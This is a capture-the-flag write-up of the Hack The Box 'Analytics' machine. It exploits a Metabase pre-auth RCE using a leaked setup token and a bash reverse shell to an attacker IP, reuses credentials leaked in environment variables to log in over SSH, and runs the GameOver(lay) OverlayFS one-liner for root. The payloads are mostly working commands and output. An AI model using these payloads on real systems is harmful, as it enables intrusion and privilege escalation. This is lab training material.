---
layout: post
title: HTB Analytics WriteUp
date: 2024-06-21
categories:
  - HackTheBox
  - HackTheBox-Linux
tags:
  - HackTheBox
  - CTF
  - Linux
  - OSCP
  - Metabase
  - Virtual-Hosting
  - Docker 
  - Env-Variable-Leakage
  - Kernel
  - OverlayFS

media_subpath: /assets/img/Analytics/
---
![Desktop View](Analytics.png){: w="800"  h="400" }



# Analytics Skills

>**Analytics** is an easy Linux machine where we will use the following skills:


---
## IP Address Enumeration

Using the usual Nmap scan I've discovered port **22** & port **80**:

```perl
> nmap -p- --open -sS --min-rate 10000 -vvv -n -Pn 10.10.11.233

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 14:40 CEST
Initiating SYN Stealth Scan at 14:40
Scanning 10.10.11.233 [65535 ports]
Discovered open port 22/tcp on 10.10.11.233
Discovered open port 80/tcp on 10.10.11.233
```

Then i launched a basic group of scripts to seek more info from the open ports:

```perl
> nmap -sCV -p22,80 10.10.11.233

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 14:41 CEST
Nmap scan report for 10.10.11.233
Host is up (0.071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Taking a look at the port 80, we are being redirected to ***http://analytical.htb***, so i added the URL to my `/etc/hosts`:

```bash
echo "10.10.11.233 analytical.htb" | tee -a /etc/hosts
```

---
## Web Enumeration

At first i run `whatweb`,  to seek for some versions and technologies used in the website:

```bash
> whatweb http://analytical.htb

http://analytical.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Nothing fancy beside an **Email Address**.

So i will take a look inside the website, once inside ***http://analytical.htb***, we are in front of the following website:

![Desktop View](AnalyticsPrincipalPage.png)

After trying all the features in the website the **Login** page redirect us to ***http://data.analytical.htb***, a subdomain, so i added the URL to my `/etc/host`:

```bash
echo "10.10.11.233 data.analytical.htb" | tee -a /etc/hosts
```

---
## Shell as Metabase

Once again i run `whatweb`, to seek for some versions and technologies used in the subdomain:

```bash
> whatweb http://data.analytical.htb

http://data.analytical.htb [200 OK] Cookies[metabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[metabase.DEVICE], IP[10.10.11.233], Script[application/json], Strict-Transport-Security[max-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Taking a look at the response, we can repeatedly see the word *`Metabase`* but before searching for vulns i will check the website.

Once inside ***http://analytical.htb***, we are in front of the following website:

![Desktop View](AnalyticsSubdomainPage.png)

We find a Login page and once again the name *`Metabase`*, i never heard about it, so i searched it.

>**Metabase** is a open-source product with a lot of tools to simplify business intelligence, from embeddable charts and interactive **dashboards, to GUI and SQL** editors, to auditing, **data sandboxing** and more.

Checking for any public vuln associated with *Metabase* i found a critical **Pre-Authenticated RCE** working in 0.46.6 version, so i have to find a way to detect the version, after a bit of research i found there is a exposed API endpoint that reveals the version and also the `setup-token`, the main cause of why we can get RCE.

In the following endpoint: ***http://data.analytical.htb/api/session/properties*** and filtering by the word `version`, we see the next string:

```json
"version":{"date":"2023-06-29","tag":"v0.46.6"
```

So it should be vulnerable, the next exploit allow us to inject a command of our choice:

-  **Exploit**: [https://github.com/Pyr0sec/CVE-2023-38646/blob/main/exploit.py](https://github.com/Pyr0sec/CVE-2023-38646/blob/main/exploit.py)

It asks for the next arguments:

-  **-u**: Target URL
-  **-t**: Setup-Token
-  **-c**: Command

We can find the `setup-token` inside the mentioned API endpoint by filtering for the word `setup-token`, we will see the next string:

```json
"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

So now we can run the exploit, the final command looks like this:

```bash
python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'
```

Before running it, set a listener in the specified port, in my case port `443`.

```bash
nc -nlvp 443
```

After executing, the script show us the response of the server.

```bash
 python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'

Payload sent!

NOTE: Make sure to open a listener on the specifed port and address if you entered a reverse shell command.

RESPONSE:
{"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0MyAwPiYx}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
```

And then we will receive the reverse shell.

```bash
 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.233] 42044
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
23af060675f1:/$ 
```

---
## Shell as Metalytics

_We usually will try to get a fully interactive TTY but we are inside a container, it doesn't have `script` installed and neither `python`._

Once inside the machine we can guess that we are in a container by the name of the machine: `23af060675f1`

After running the command `hostname -a` we can see that we are in the `172.17.0.2`  so we have to figure a way to pivot to the host.

### Information Leakage From ENV Variable

After trying some ways like checking sudoers, SUID, CRON Jobs and Capabilities i found nothing, after a while i checked the system **environment variables** and there are credentials for a user named *Metalytics*

```bash
23af060675f1:/$ printenv 

META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

So due to the SSH service is active i will try those credentials with SSH.

```bash
ssh metalytics@10.10.11.233
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jun 21 06:51:07 PM UTC 2024

  System load:              0.294921875
  Usage of /:               93.5% of 7.78GB
  Memory usage:             24%
  Swap usage:               0%
  Processes:                150
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:1634

  => / is using 93.5% of 7.78GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ 
```

We can now see the user flag inside our home directory: `/home/metalytics/user.txt`.

![Desktop View](AnalyticsUserFlag.png)

-- -
## Shell as Root

Once inside, at first i checked the Kernel version:

```bash
metalytics@analytics:~$ uname -a

Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Showing a `6.2.0` version seems quite updated, but after a quick search i found that should be vulnerable to `CVE-2023-3262: GameOver(lay)`.

This exploit abuse OverlayFS, that is a common mount filesystem for Linux, i will link below a really good post explaining this vulnerability:

-  **Explanation**: [https://thesecmaster.com/blog/how-to-fix-gameoverlay-two-local-privilege-escalation-vulnerabilities-in-ubuntu-linux-kernel](https://thesecmaster.com/blog/how-to-fix-gameoverlay-two-local-privilege-escalation-vulnerabilities-in-ubuntu-linux-kernel)

The exploit is quite short, it's just a one-liner that allow us to execute a desired command as the user `root`, the exploit looks like this:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

---
### Payload Explanation

 `unshare -rm`

- `unshare` is a command that allows you to run a program in a new namespace. A namespace is a feature of the Linux kernel that partitions kernel resources so that one set of processes sees one set of resources while another set of processes sees another, isolated set of resources.
- The `-r` option creates a new user namespace and maps the user to root in the new namespace.
- The `-m` option creates a new mount namespace, meaning that any mounts made won't be seen by processes outside of this namespace.

 `sh -c “mkdir l u w m && cp /u*/b*/p*3 l/;`

- This invokes a new shell `sh` to execute the command string provided after `-c`.
- `mkdir l u w m` creates four directories named `l`, `u`, `w`, and `m`.
- `cp /u*/b*/p*3 l/` this command is copying a Python3 binary (based on the pattern `/u*/b*/p*3`) to the `l` directory.

 `setcap cap_setuid+eip l/python3;`

- `setcap` is used to set capabilities on binaries.
- `cap_setuid` allows the binary to change its UID (User Identifier).
- `+eip` ensures that the capability is effective, inheritable, and permitted.
- This command is granting the python3 binary in the `l` directory the ability to change its user ID, effectively allowing it to become any user, including root.

 `mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m`

- This mounts an overlay filesystem. Overlay filesystems let you overlay one directory (called the upper directory) on top of another (called the lower directory).
- Here, it’s overlaying the directory `u` over `l`, using `w` as a work directory, and mounting the resulting filesystem at `m`.

`touch m/*`

- This command is creating a new, empty file for every file that exists in the `m` directory.

`u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`

- After the `sh` command sequence completes, this runs a Python3 command from the `u` directory.
- `os.setuid(0)`sets the user ID of the current process to 0, which is the UID for root. Given that the Python3 binary has been granted the `cap_setuid` capability, it can effectively change its UID to root.
- `os.system("/bin/bash")`starts a new bash shell. Since the process's user ID was just set to root, this bash shell runs with root privileges.

---

Once we execute the payload it should return us a shell as `root`

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
root@analytics:~# 
```

Then just cat to `/root/root.txt` and you can see the root flag:

![Desktop View](AnalyticsRootFlag.png)

-- -

![Desktop View](AnalyticsPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

